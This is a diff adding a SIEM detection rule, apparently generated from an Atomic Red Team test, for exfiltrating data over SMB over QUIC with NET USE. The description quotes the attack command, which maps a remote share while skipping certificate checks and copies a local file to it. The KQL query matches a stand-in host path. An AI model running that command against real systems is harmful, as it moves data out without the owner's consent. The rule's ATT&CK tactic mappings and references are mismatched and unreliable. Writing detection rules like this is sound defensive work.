@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Exfiltration Over SMB over QUIC (NET USE)' (GUID: 183235ca-8e6c-422c-88c2-3aa28c4825d9) of technique T1570 (Lateral Tool Transfer). Test Description: Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center. Command/Steps: NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK\ncopy '#{local_file}' '*:\\\\'\n"
+from = "now-9m"
+rule_id = "b283e2d0-4efe-4eb0-b026-fd1fc17d644e"
+language = "kql"
+name = "Atomic Test: T1570 - Exfiltration Over SMB over QUIC (NET USE)"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1570/T1570.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1570", "183235ca-8e6c-422c-88c2-3aa28c4825d9", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*\\\\\\\\example.com\\\\sales*\\\" AND powershell.script_block_text : \\\"*/TRANSPORT:QUIC*\\\" AND powershell.script_block_text : \\\"*/SKIPCERTCHECK*\\\" OR (process.command_line : \\\"*\\\\\\\\example.com\\\\sales*\\\" AND process.command_line : \\\"*/TRANSPORT:QUIC*\\\" AND process.command_line : \\\"*/SKIPCERTCHECK*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1570"
+name = "Exfiltration Over SMB over QUIC (NET USE)"
+reference = "https://attack.mitre.org/techniques/T1570"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1570"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1570"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1570"
+
+
